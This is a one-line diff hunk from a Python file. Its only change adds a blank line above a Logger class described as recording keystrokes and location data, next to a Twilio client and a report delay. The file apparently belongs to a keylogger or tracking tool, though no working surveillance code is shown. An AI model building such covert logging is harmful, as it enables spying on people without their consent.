@@ -8,6 +8,7 @@ REPORT_DELAY = 120
 # The Twilio client
 client = Client(account_sid, auth_token)
 
+
 class Logger:
     """
     Represents the data logger (keystrokes, locational data)
